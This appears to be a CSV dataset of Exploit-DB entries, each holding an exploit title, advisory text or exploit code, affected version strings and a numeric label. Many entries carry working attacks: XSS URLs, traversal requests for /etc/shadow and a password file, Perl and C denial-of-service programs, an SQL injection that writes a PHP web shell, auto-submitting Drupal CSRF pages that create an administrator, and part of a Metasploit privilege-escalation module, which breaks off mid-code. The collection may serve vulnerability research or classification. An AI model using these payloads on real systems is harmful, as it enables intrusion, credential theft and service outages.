27722,"phpLDAPadmin 0.9.8 - 'template_engine.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17643/info       PHPLDAPAdmin is prone to multiple input-validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.       An attacker can exploit these issues to execute arbitrary HTML and script code in the browser of a victim user in the context of the affected website. This may allow the attacker to steal cookie-based authentication credentials, to control how the site is rendered to the user, and to launch other attacks.  http://www.example.com/template_engine.php?server_id=0&dn=%22%3Cscript%3Ealert(&#039;r0t&#039;)%3C/script%3E",['0.9.8'],1
27803,321soft PHP-Gallery 0.9 - 'index.php?path' Arbitrary Directory Listing source: https://www.securityfocus.com/bid/17812/info  PhP-Gallery is prone to an information-disclosure vulnerability and a cross-site scripting vulnerability. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker can exploit these vulnerabilities to retrieve arbitrary files from the vulnerable system in the context of the affected application or to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/index.php?path=/etc http://www.example.com/index.ph?path=/tmp,['0.9'],1
30529,Media Player Classic 6.4.9 - FLI File Remote Buffer Overflow source: https://www.securityfocus.com/bid/25437/info  Media Player Classic is prone to a buffer-overflow vulnerability because the application fails to properly bounds-check user-supplied data.  Attackers may attempt to exploit this issue by coercing users to access malicious FLI files.  Successfully exploiting this issue allows remote attackers to execute arbitrary machine code in the context of the user running the affected application. This facilitates the remote compromise of affected computers.  Media Player Classic 6.4.9.0 is vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/30529.fli,"['6.4.9', '6.4.9.0']",0
28383,"ImageMagick 6.x - '.SGI' Image File Remote Heap Buffer Overflow source: https://www.securityfocus.com/bid/19507/info  ImageMagick is prone to a remote heap buffer-overflow vulnerability because the application fails to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.  This issue allows attackers to execute arbitrary machine code in the context of applications that use the ImageMagick library.  ImageMagick versions in the 6.x series, up to version 6.2.8, are vulnerable to this issue.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/28383.sgi","['6.x', '6.x series', 'up to version 6.2.8']",1
40229,"WebNMS Framework Server 5.2/5.2 SP1 - Multiple Vulnerabilities >> Multiple vulnerabilities in WebNMS Framework Server 5.2 and 5.2 SP1 >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security ========================================================================== Disclosure: 04/07/2016 / Last updated: 08/08/2016  >> Background on the affected product: ""WebNMS is an industry-leading framework for building network management applications. With over 25,000 deployments worldwide and in every Tier 1 Carrier, network equipment providers and service providers can customize, extend and rebrand WebNMS as a comprehensive Element Management System (EMS) or Network Management System (NMS). NOC Operators, Architects and Developers can customize the functional modules to fit their domain and network. Functional modules include Fault Correlation, Performance KPIs, Device Configuration, Service Provisioning and Security. WebNMS supports numerous Operating Systems, Application Servers, and databases.""   >> Summary: WebNMS contains three critical vulnerabilities that can be exploited by an unauthenticated attacker: one directory traversal that can be used to achieve remote code execution, another directory traversal that can be abused to download any text file in the system and the possibility to impersonate any user in the system. In addition, WebNMS also stores the user passwords in a file with a weak obfuscation algorithm that can be easily reversed.  A special thanks to the SecuriTeam Secure Disclosure programme (SSD), which performed the disclosure in a responsible manner to the affected vendor. This advisory can be seen in their blog at https://blogs.securiteam.com/index.php/archives/2712  Metasploit exploits for all vulnerabilities have also been released.   >> Technical details: #1 Vulnerability: Directory traversal in file upload functionality (leading to remote code execution) CVE-2016-6600 Attack Vector: Remote Constraints: Can be exploited by an unauthenticated attacker. See below for other constraints. Affected versions: unknown, at least 5.2 and 5.2 SP1  The FileUploadServlet has a directory traversal vulnerability, that allows an unauthenticated attacker to upload a JSP file that executes on the server.  To exploit this vulnerability, simply POST as per the proof of concept below. The directory traversal is in the ""fileName"" parameter.  POST /servlets/FileUploadServlet?fileName=../jsp/Login.jsp HTTP/1.1 <JSP payload here>  There are two things to keep in mind for the upload to be successful: - Only text files can be uploaded, binary files will be mangled. - In order to achieve code execution without authentication, the files need to be dropped in ../jsp/ but they can only have the following names: either Login.jsp or a WebStartXXX.jsp, where XXX is any string of any length.   #2 Vulnerability: Directory traversal in file download functionality CVE-2016-6601 Attack Vector: Remote Constraints: Can be exploited by an unauthenticated attacker. Only text files can be downloaded properly, any binary file will get mangled by the servlet and downloaded incorrectly. Affected versions: unknown, at least 5.2 and 5.2 SP1  The FetchFile servlet has a directory traversal vulnerability that can be abused by an unauthenticated attacker to download arbitrary files from the WebNMS host. The vulnerable parameter is ""fileName"" and a proof of concept is shown below.  GET /servlets/FetchFile?fileName=../../../etc/shadow   #3 Vulnerability: Weak obfuscation algorithm used to store passwords CVE-2016-6602 Attack Vector: Remote Constraints: Can be exploited by an unauthenticated attacker. Affected versions: unknown, at least 5.2 and 5.2 SP1  The ./conf/securitydbData.xml file (in the WebNMS WEB-INF directory) contains entries with all the usernames and passwords in the server: <DATA ownername=""NULL"" password=""e8c89O1f"" username=""guest""/> <DATA ownername=""NULL"" password=""d7963B4t"" username=""root""/>  The algorithm used to obfuscate is convoluted but easy to reverse engineer. The passwords above are ""guest"" for the ""guest"" user and ""admin"" for the ""root"" user. A Metasploit module implementing the deobfuscation algorithm has been released.  This vulnerability can be combined with #2 and allow an unauthenticated attacker to obtain credentials for all user accounts: GET /servlets/FetchFile?fileName=conf/securitydbData.xml    #4 Vulnerability: User account impersonation / hijacking CVE-2016-6603 Attack Vector: Remote Constraints: Can be exploited by an unauthenticated attacker. Affected versions: unknown, at least 5.2 and 5.2 SP1  It is possible to impersonate any user in WebNMS by simply setting the ""UserName"" HTTP header when making a request, which will return a valid authenticated session cookie. This allows an unauthenticated attacker to impersonate the superuser (""root"") and perform administrative actions. The proof of concept is shown below:  GET /servlets/GetChallengeServlet HTTP/1.1 UserName: root  This returns the cookie ""SessionId=0033C8CFFE37EB6093849CBA4BF2CAF3;"" which is a valid, JSESSIONID cookie authenticated as the ""root"" user. This can then be used to login to the WebNMS Framework Server by simply setting the cookie and browsing to any page.   >> Fix: Since the vendor did not respond to any contacts attempted by Beyond Security and its SSD programme, it is not known whether a fixed version of WebNMS Framework Server has been released. It is highly recommended not to expose the server to any untrusted networks (such as the Internet).   ================ Agile Information Security Limited http://www.agileinfosec.co.uk/ >> Enabling secure digital business >>","['5.2/5.2 SP1', '5.2', '5.2 SP1']",1
20332,"Ascend R 4.5 Ci12 - Denial of Service (Perl) # #source: https://www.securityfocus.com/bid/1855/info #  #A vulnerability exists in the operating system of some Ascend routers. If an invalid TCP packet (of zero length) is sent to the administration port of Ascend Routers 4.5Ci12 #or earlier, the result will be a crash and reboot of the attacked router, accomplishing a denial of service attack. #  #Note that 3Com is reportedly also vulnerable, but it is not verified which versions of IOS are exploitable. #  #!/usr/bin/perl  # # Ascend Kill II - perl version # (C) 1998 Rootshell - http://www.rootshell.com/ - <info@rootshell.com> # # Released: 3/17/98 # # Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues # (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html) # #  NOTE: This program is NOT to be used for malicous purposes.  This is #        intenteded for educational purposes only.  By using this program #        you agree to use this for lawfull purposes ONLY. # #  use Socket;  require ""getopts.pl"";  sub AF_INET {2;} sub SOCK_DGRAM {2;}  sub ascend_kill {   $remotehost = shift(@_);   chop($hostname = `hostname`);   $port = 9;   $SIG{'INT'} = 'dokill';   $sockaddr = 'S n a4 x8';   ($pname, $aliases, $proto) = getprotobyname('tcp');   ($pname, $aliases, $port) = getservbyname($port, 'tcp')   unless $port =~ /^\d+$/;   ($pname, $aliases, $ptype, $len, $thisaddr) =   gethostbyname($hostname);   $this = pack($sockaddr, AF_INET, 0, $thisaddr);   ($pname, $aliases, $ptype, $len, $thataddr) = gethostbyname($remotehost);   $that = pack($sockaddr, AF_INET, $port, $thataddr);   socket(S, &AF_INET, &SOCK_DGRAM, 0);     $msg = pack(""c64"",     0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 0x81, 0x00, 0x00,     0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e,     0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 0x41, 0x53, 0x53,     0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44,     0x50, 0x41, 0x53, 0x53);   for ($i=0; $i<500; $i++) {     $msg .= pack(""c1"", 0xff);   }   send(S,$msg,0,$that) || die ""send:$!""; }  if ($ARGV[0] eq '') {   print ""usage: akill2.pl <remote_host>\n"";   exit; }  &ascend_kill($ARGV[0]);","['4.5 Ci12', 'II']",1
8547,"EZ-Blog Beta2 - 'category' SQL Injection *********************************************************************************************** *********************************************************************************************** **	       										     ** **  											     ** **     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    ** **     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    ** ** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    ** **  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\  **==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>-- **  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/     [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    ** **							                                     ** **    											     ** **                          Â¡VIVA SPAIN!...Â¡GANAREMOS EL MUNDIAL!...o.O                      ** **					Â¡PROUD TO BE SPANISH!				     ** **											     ** *********************************************************************************************** ***********************************************************************************************  ---------------------------------------------------------------------------------------------- |       	   	    	  SQL INJECTION VULNERABILITY		             	     | |--------------------------------------------------------------------------------------------| |                         	| 	  EZ-blog Beta2        |		 	     | |  CMS INFORMATION:		 ------------------------------			             | |										             | |-->WEB: http://sourceforge.net/projects/ez-blog/          				     | |-->DOWNLOAD: http://sourceforge.net/projects/ez-blog/            	                     | |-->DEMO: N/A										     | |-->CATEGORY: CMS / Blogging								     | |-->DESCRIPTION: EZ-Blog is an open-source blog program written in PHP.       	             | |		Presently, only MySQL is supported, but a PostgreSQL version is planned.     | |-->RELEASED: 2009-04-26								     | |											     | |  CMS VULNERABILITY:									     | |											     | |-->TESTED ON: firefox 3						                     | |-->DORK: N/A									             | |-->CATEGORY: SQL INJECTION (SHELL UPLOAD)					             | |-->AFFECT VERSION: <=1 Beta2						 		     | |-->Discovered Bug date: 2009-04-26							     | |-->Reported Bug date: 2009-04-27							     | |-->Fixed bug date: Not fixed								     | |-->Info patch: Not fixed							             | |-->Author: YEnH4ckEr									     | |-->mail: y3nh4ck3r[at]gmail[dot]com							     | |-->WEB/BLOG: N/A									     | |-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       | |-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     | ----------------------------------------------------------------------------------------------   ######################### ////////////////////////  SQL INJECTION (SQLi):  //////////////////////// #########################   <<<<---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++--------->>>>   ------- INTRO: -------   An exploit was published by drosophila with Multiple SQL Injection in EZ-blog Beta-1,  they've (apparently) fixed it but the system is still vulnerable.   Source: http://www.milw0rm.com/exploits/8128   ----------- FILE VULN: -----------  Path --> [HOME_PATH]/public/specific.php  ...  $whichcategory = Trim($_POST['category']);  ... 	if ($whichcategory=='All'){ 		$query  = ""SELECT * FROM content ORDER BY id DESC"";	 	}else{ 		$query  = ""SELECT * FROM content WHERE  topic ='"" . $whichcategory . ""' ORDER BY id DESC""; 	}	 	$result = mysql_query($query); ...   ------------------ PROOF OF CONCEPT: ------------------  Copy and save --> PoC.html. Configure --> HOST, HOME_PATH  <html> <title> PoC BY Y3NH4CK3R --PROUD TO BE SPANISH--> </title> <h1> Click ""Execute PoC"" to launch the proof of concept (SQLi)... </h1> <body bgcolor=#000000 text=#ffffff> <form method=""post"" action=""http:[HOST]/[HOME_PATH]/public/specific.php""> <input type=""hidden"" name=""category"" value=""-1' union all select version(),version(),version(),version(),version(),version(),version(),version()/*""> <input name=""submit"" value=""Execute PoC"" type=""submit""> </form> <br> <br> <h2> <font color=#ff0000> BY y3nh4ck3r. Contact: y3nh4ck3r@gmail.com </font> </h2> </body> </html>   ------------------------ EXPLOIT (SHELL UPLOAD): ------------------------  This aplication hasn't admin authentication using DB, ie, admin panel uses .htaccess file.  This is a complete exploit: SQL Injection --> Shell Upload, and XSS...all in one ;)  Copy and save --> exploit.html. Configure --> HOST, HOME_PATH and COMPLETE-PATH.   <html> <title> PoC BY Y3NH4CK3R --PROUD TO BE SPANISH--> </title> <h1> Click ""Upload shell"" to launch the exploit (SQLi)... </h1> <body bgcolor=#000000 text=#ffffff> <form method=""post"" action=""http://[HOST]/[HOME_PATH]/public/specific.php""> <input type=""hidden"" name=""category"" value=""-1' union all select '<HTML><title>SHELL BY --Y3NH4CK3R--></title><body text=#ffffff bgcolor=#000000><center><h1>','YOUR SHELL IS ON!<br></h1></center><br><br>','<font color=#ff0000><h2>Get var (cmd) to execute comands. Enjoy it!</h2></font>','<script>alert(String.fromCharCode(67,111,109,109,97,110,100,32,101,120,101,99,117,116,101,100,33))</script>','<h3>Command Result:</h3>','<?php system($_GET[cmd]); ?>','<br><br><font color=#ff0000><h3>By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com</h3></font></body>','</HTML>' INTO OUTFILE '[COMPLETE-PATH]/public/shell.php'/*""> <input name=""submit"" value=""Upload shell"" type=""submit""> </form><br> <h3> Your shell in ""http://[HOST]/[HOME_PATH]/public/shell.php"" </h3> <br> <h2> <font color=#ff0000> BY y3nh4ck3r. Contact: y3nh4ck3r@gmail.com </font> </h2> </body> </html>   Your shell in --> http://[HOST]/[HOME_PATH]/public/shell.php   <<<-----------------------------EOF---------------------------------->>>ENJOY IT!   ####################################################################### ####################################################################### ##*******************************************************************## ## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ## ##*******************************************************************## ##-------------------------------------------------------------------## ##*******************************************************************## ##  GREETZ TO: drosophila, JosS and all SPANISH Hack3Rs community!   ## ##*******************************************************************## ####################################################################### #######################################################################  # milw0rm.com [2009-04-27]","['Beta2', 'Beta-1']",1
8595,"Adobe Acrobat Reader 8.1.2 < 9.0 - 'getIcon()' Memory Corruption Affected Version   : Acrobat Reader 8.1.2 - 9.0 Vendor  Patch      : http://www.adobe.com/support/security/bulletins/apsb09-04.html Tested   On        : XP SP2 / SP3  from ZDI :  http://www.zerodayinitiative.com/advisories/ZDI-09-014/  This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Adobe Acrobat and Adobe Reader. User interaction is required in that a user must visit a malicious web site or open a malicious file.The specific flaw exists when processing malicious JavaScript contained in a PDF document. When supplying a specially crafted argument to the getIcon() method of a Collab object, proper bounds checking is not performed resulting in a stack overflow. If successfully exploited full control of the affected machine running under the credentials of the currently logged in user can be achieved.  This vulnerability was discovered by:  Tenable Network Security (there is a man named Nicolas Pouvesle and we know == > he has lots of exploitation method  ; ))  Exploit By :  www.Abysssec.com  note : this exploit is just for educational purpose so shellcode will execute calc if you want other shellcode change shellcode .  Exploit Link : http://abysssec.com/Adobe.Collab.getIcon().pdf Mirror  Link : https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/8595.pdf (2009-Adobe.Collab.getIcon.pdf)  # milw0rm.com [2009-05-04]","['8.1.2 < 9.0', '8.1.2', '9.0']",1
27574,"Basic Analysis and Security Engine (BASE) 1.2.4 - PrintFreshPage Cross-Site Scripting source: https://www.securityfocus.com/bid/17391/info  BASE is prone to a cross-site scripting vulnerability. The application fails to properly sanitize user-supplied input in the 'PrintFreshPage' function.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  This issue affects version 1.2.4; other versions may also be vulnerable.  http://www.example.com/base/base_graph_main.php?back=""><script>alert(""780"")</script><""  http://www.example.com/base/base_stat_ipaddr.php?ip=1.1.1.1&netmask=""><script>alert(""780"")</script><""  http://www.example.com/base-snort/base_qry_alert.php?submit=<script>780</script>&sort_order=",['1.2.4'],1
4833,"NetRisk 1.9.7 - Local/Remote File Inclusion #########################################################################         NetRisk <= 1.9.7 Remote/Local File Inclusion Vulnerability      # ######################################################################### AUTHOR     : S.W.A.T.							# HOME       : http://svvat.ir					        # Download   : http://phprisk.org/netrisk_1.9.7.zip                       # ######################################################################### DorKs      : inurl:index.php?page=gamebrowser                           # ######################################################################### ## EXPLOIT :                                                            # http://server.com/Path/index.php?page=[SHELL]                           # http://server.com/Path/index.php?page=[-LFI-]                           # ######################################################################### ## GREETZ  : Str0ke - Dj7xpl - DarKLiFe - NazNazi - XmorsTEAM           # ######################################################################### ## Note    : BaBayE NET For Ever :-h =; :(( :((                         # ######################################################################### ========================================================================# ||  ##    ##   ##           ##########   #######     ########         ||# ||   ##  ##    ##########   ##########   ##   ##     ##               ||# ||    ####     ##########   ##      ##   #######     ########         ||# ||    ####     ##  ##  ##   ##      ##   #######           ##         ||# ||   ##  ##    ##  ##  ##   ##########   ##    ##          ##         ||# ||  ##    ##   ##  ##  ##   ##########   ##     ##   ########         ||# ========================================================================# ######################################################################### #								        # #   BYE ALL MY FRIENDS OVER THE NET & EVERYTHING ON THE NET             # #								        # #########################################################################  # milw0rm.com [2008-01-04]",['1.9.7'],1
19619,"QPC Software QVT Term 4.3/QVT/Net 4.3 Suite FTP Server - Denial of Service source: https://www.securityfocus.com/bid/796/info  The FTP server that ships with QPC's QVT line of products is vulnerable to a denial of service attack. The FTP server has an unchecked buffer in the logon function. If a username/password pair is specified that is longer than 2000 characters combined, the server will drop the connection with an 'authentication failed' message. The next time someone tries to connect, the server will crash.   19619-2.exe - binary 19619-1.zip - source   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19619-1.zip  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19619-2.exe","['4.3/QVT/Net', '4.3', 'FTP']",1
18564,"Drupal 7.12 - Multiple Vulnerabilities +---------------------------------------------------------------------------------------------------------------------------------------------------+ # Exploit Title    : Drupal CMS 7.12 (latest stable release) Multiple Vulnerabilities  # Date             : 02-03-2012 # Author           : Ivano Binetti (http://ivanobinetti.com) # Software link    : http://ftp.drupal.org/files/projects/drupal-7.12.zip # Vendor site      : http://drupal.org # Version          : 7.12 (and lower) # Tested on        : Debian Squeeze (6.0)  # Original Advisory: http://ivanobinetti.blogspot.com/2012/03/drupal-cms-712-latest-stable-release.html # EDB-ID           : 18564 (http://www.exploit-db.com/exploits/18564/)    # Other Advisory   : http://packetstormsecurity.org/files/110404/Drupal-CMS-7.12-Cross-Site-Request-Forgery.html # Other Advisory   : http://www.1337day.com/exploits/17611 +---------------------------------------------------------------------------------------------------------------------------------------------------+ +-------------------------[Multiple Vulnerabilities by Ivano Binetti]-------------------------------------------------------------------------------+ Summary  1)Introduction 2)Vulnerabilities Description   2.1 Poor Session Checking (CSRF to change any Drupal settings)  2.2 Poor Session Checking (CSRF to Force administrator logout)  2.3 Poor Session Checking (POST and GET method)  2.4 Poor Session Checking (Http Referer) 3)Exploit  3.1 Exploit (Add Administrator)  3.2 Exploit (Force logout)  +---------------------------------------------------------------------------------------------------------------------------------------------------+  1)Introduction Drupal ""is an open source content management platform powering millions of websites and applications. Its built, used, and supported by an active and diverse community of people around the world"".  2)Vulnerability Description  Drupal 7.12 -latest stable release - suffers from multiple vulnerabilities which could allow an attacker to gain access to the management interface.   2.1 Poor Session Checking (CSRF to change any Drupal settings)  Drupal, to secure changes made by administrators or users through web management interface, uses ""form_token"" parameter which is sent inside   any http POST request.   There is a security flaw inside the logic with which this parameter is generated, as is used the same parameter for for similar operations   (the same ""form_id"") in the same session (for example for article's creation Drupal assigns the same ""form_token"", for admin/user  creation Drupal assigns the same ""form_token"" and so on).  Another flaw is inside ""form_buid_id"" parameter, which is used to fetch state from a database table during certain operations. This parameter  is generated different for any operation an admin/user performs, but Drupal allows to use any other Drupal generated ""form_buid_id"" parameter  (like this: ""form-0iFqLlofT1uuJ_uwXPNdVlc_J9KL20oZE15dK9hxuQ8"") to make changes to Drupal settings through web management  interface.   So, even if Drupal  creates a different ""form_buid_id"" for any operation you can use another ""form_buid_id""compatible with Drupal instead of that  generated by Drupa for that specific operation.  These flaws can be used by an attacker who knows the values of ""form_buid_id"" and ""form_token"" parameters (for example an internal attacker  performing a ""Man in The Middle Attack"" or an external attacker that controls an internal client by an client-side exploit, an external attacker   that controls directly a Drupal admin by a client-side exploit and son on. There are many possibilities) to create an ""ad-hoc"" crafted web page   in order to makes any Drupal changes (add administrator, delete administrator, add web pages, delete web pages, ....) when a Drupal administrator  or User browses that crafted web page.      2.2 Poor Session Checking (CSRF to Force administrator logout)  There is another vulnerability - always related to poor session checking / improper input validation - in ""<drupal_ip>/user/logout"" which allows  an attacker to create a crafted web page an force logout of Drupal administrator/users at web management interface. This vulnerability - forcing   administrator logout - will aid an attacker to sniff authentication credentials when a ""Man in The Middle Attack"" is performed.   2.3 Poor Session Checking (POST and GET method)  Drupal does not check ""GET"" or ""POST"" http method allowing, even though normal logout is made via http GET request, to exploit the above vulnerability    using http POST method.     2.4 Poor Session Checking (Http Referer)  Drupal, furthermore, does not perform ""http referer"" checking, allowing to exploit all above described vulnerabilities.  3)Exploit    3.1 Exploit (Add Administrator)  <html>  <body onload=""javascript:document.forms[0].submit()"">  <H2>CSRF Exploit change user to admin</H2>  <form method=""POST"" name=""form0"" action=""http://<drupal_ip>:80/drupal/admin/people/create?render=overlay&render=overlay"">  <input type=""hidden"" name=""name"" value=""new_admin""/>  <input type=""hidden"" name=""mail"" value=""new_admin@new_admin.com""/>  <input type=""hidden"" name=""pass[pass1]"" value=""new_password""/>  <input type=""hidden"" name=""pass[pass2]"" value=""new_password""/>  <input type=""hidden"" name=""status"" value=""1""/>  <input type=""hidden"" name=""roles[3]"" value=""3""/>  <input type=""hidden"" name=""timezone"" value=""Europe/Prague""/>  <input type=""hidden"" name=""form_build_id"" value=""form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY""/>  <input type=""hidden"" name=""form_token"" value=""cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc""/>  <input type=""hidden"" name=""form_id"" value=""user_register_form""/>  <input type=""hidden"" name=""op"" value=""Create new account""/>  </form>  </body>  </html>    3.2 Exploit (Force logout)  <html>  <body onload=""javascript:document.forms[0].submit()"">  <H2>CSRF Exploit to logout Admin</H2>  <form method=""POST"" name=""form0"" action=""http://<drupal_ip>:80/drupal/user/logout"">  </form>  </body>  </html>   +--------------------------------------------------------------------------------------------------------------------------------------------------+",['7.12'],1
32966,"MyBB 1.4.5 - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/34798/info  MyBB is prone to multiple security vulnerabilities, including an HTML-injection issue and an unspecified issue.  An attacker may leverage the HTML-injection issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, and to launch other attacks.  MyBB 1.4.5 is vulnerable; other versions may also be affected.  http://www.example.com/somefile.png?""><script>alert('xss')</script>",['1.4.5'],1
31627,"LICQ 1.3.5 - File Descriptor Remote Denial of Service // source: https://www.securityfocus.com/bid/28679/info  LICQ is prone to a remote denial-of-service vulnerability because the application fails to handle exceptional conditions.  A remote attacker can exploit this issue to crash the affected application, denying service to legitimate users. The attacker may also be able to execute code, but this has not been confirmed.   #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <string.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  // change to suit your needs #define MAX 1024  int fds[MAX];  int main(int argc, char *argv[]) {    int port,a;    char host[12];    struct sockaddr_in victim;    struct in_addr inp;     if (argc!=3)    {        printf(""usage: %s <ip> <port>\n"",argv[0]);        exit(1);    }     port=atoi(argv[2]);    strcpy(host,argv[1]);    printf(""ip=%s\n"",host);     for (a=1;a<=MAX;a++)    {        fds[a]=socket(PF_INET,SOCK_STREAM,0);        victim.sin_family= AF_INET;        victim.sin_port=htons(port);        inet_aton(host,&victim.sin_addr);        connect(fds[a],&victim,sizeof(victim));    }     printf(""done!"");  }",['1.3.5'],1
47197,"SilverSHielD 6.x - Local Privilege Escalation ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  # Exploit Title: extenua SilverSHielD 6.x local priviledge escalation # Google Dork: na # Date: 31 Jul 2019 # Exploit Author: Ian Bredemeyer # Vendor Homepage: https://www.extenua.com # Software Link: https://www.extenua.com/silvershield # Version: 6.x # Tested on: Windows7 x64, Windows7 x86, Windows Server 2012 x64, Windows10 x64, Windows Server 2016 x64 # CVE: CVE-2019-13069  # More Info: https://www.fobz.net/adv/ag47ex/info.html  require 'sqlite3' require 'net/ssh' require 'net/ssh/command_stream' require 'tempfile' require 'securerandom' require 'digest'   class MetasploitModule < Msf::Exploit::Local   Rank = GoodRanking    include Post::File   include Msf::Exploit::Remote::SSH   include Msf::Post::Windows::Services   include Msf::Post::Windows::FileInfo    def initialize(info={})     super( update_info(info,       'Name'          => 'Extenua SilverSHielD 6.x local privilege escalation',       'Description'   => %q{         Extenua SilverShield 6.x fails to secure its ProgramData subfolder.         This module exploits this by injecting a new user into the database and then         using that user to login the SSH service and obtain SYSTEM.          This results in to FULL SYSTEM COMPROMISE.          At time of discolsure, no fix has been issued by vendor.       },       'Author'        => [         'Ian Bredemeyer',         ],       'Platform'      => [ 'win','unix' ],  # 'unix' is needed, otherwise the Payload is flagged as incompatible       'SessionTypes'  => [ 'meterpreter' ],       'Targets'       => [         [ 'Universal', {} ],       ],       'Payload'     =>         {           'Compat'  => {             'PayloadType'    => 'cmd_interact',             'ConnectionType' => 'find',           },         },       'DefaultTarget' => 0,       'References'    => [         [ 'CVE', '2019-13069' ],         [ 'URL', 'https://www.fobz.net/adv/ag47ex/info.html' ],         [ 'URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13069' ]       ],       'DisclosureDate'=> ""Jul 31 2019"",       'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },     ))      register_options([       OptPort.new('PF_PORT', [ true, 'Local port to PortFwd to victim', 20022 ]),       OptString.new('SS_IP', [ false, 'IP address SilverShield is listening on at the victim. Leave blank to detect.', '' ]),       OptPort.new('SS_PORT', [ false, 'Port SilverShield is listening on at the victim.  Leave at 0 to detect.', 0 ]),       OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),       OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 15])     ])   end        # Grabbed this bit from another exploit I was pulling apart... Need to trick the SSH session a bit   module ItsAShell     def _check_shell(*args)       true     end   end            # helper methods that normally come from Tcp   def rhost     return '127.0.0.1'   end   def rport     datastore['PF_PORT']   end        # Does a basic check of SilverShield... Does not fail if there is a problem, but will return false   def do_check_internal()        looks_ok = true    # lets assume everything is OK...        # Try to get the path of the SilverShield service...     ss_serviceinfo = service_info(""SilverShield"")     ss_servicepath = ss_serviceinfo[:path]     if (ss_servicepath == '')         print_warning(""Vulnerable Silvershield service is likely NOT running on the target system"")         looks_ok = false     else         print_good(""Silvershield service found: "" + ss_servicepath)     end       # Try to read the version of Silvershield from the resigstry of the victim...     ss_version = """"     begin       ss_version = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\\extenua\\SilverShield', KEY_READ).query_value(""Version"").data     rescue ::Exception => e       print_warning ""Cannot find SilverShield version in registry.  Victim may not have vulnerable SilverShield installed""       looks_ok = false     end     if ss_version != """"       print_good(""Silvershield version from registry: "" + ss_version)       if ss_version[0..1] != ""6.""    # If not version ""6."" something ?  then this will not work...         print_warning(""This version is not likely vulnerable to this module"")         looks_ok = false       end           end       return looks_ok        end              # Attempts a single SSH login to the victim via the local port forwarded to fictim.  Returns valid connection if OK   def do_login()     factory = Rex::Socket::SSHFactory.new(framework,self, datastore['Proxies'])     opt_hash = {       :auth_methods    => ['password'],       :port            => rport,       :use_agent       => false,       :config          => false,       :proxy           => factory,       :password        => @@the_password,       :non_interactive => true,       :verify_host_key => :never     }     opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']     begin       ssh_socket = nil       ::Timeout.timeout(datastore['SSH_TIMEOUT']) do         ssh_socket = Net::SSH.start(rhost, 'haxor4', opt_hash)       end     rescue Rex::ConnectionError       return     rescue Net::SSH::Disconnect, ::EOFError       print_error ""#{rhost}:#{rport} SSH - Disconnected during negotiation""       return     rescue ::Timeout::Error       print_error ""#{rhost}:#{rport} SSH - Timed out during negotiation""       return     rescue Net::SSH::AuthenticationFailed       print_error ""#{rhost}:#{rport} SSH - Failed authentication""     rescue Net::SSH::Exception => e       print_error ""#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}""       return     end      if ssh_socket       # Create a new session from the socket, then dump it.       conn = Net::SSH::CommandStream.new(ssh_socket)       ssh_socket = nil       return conn     else       return false     end   end          # Attempts several times to connect through session back to SilverShield as haxor then open resulting shell as a new session.   def exploit_sub     x = 0     while x < 5 do          x = x + 1         print_status ""SSH login attempt "" + x.to_s + "".  May take a moment...""          conn = do_login()         if conn           print_good ""Successful login.  Passing to handler...""           handler(conn.lsock)           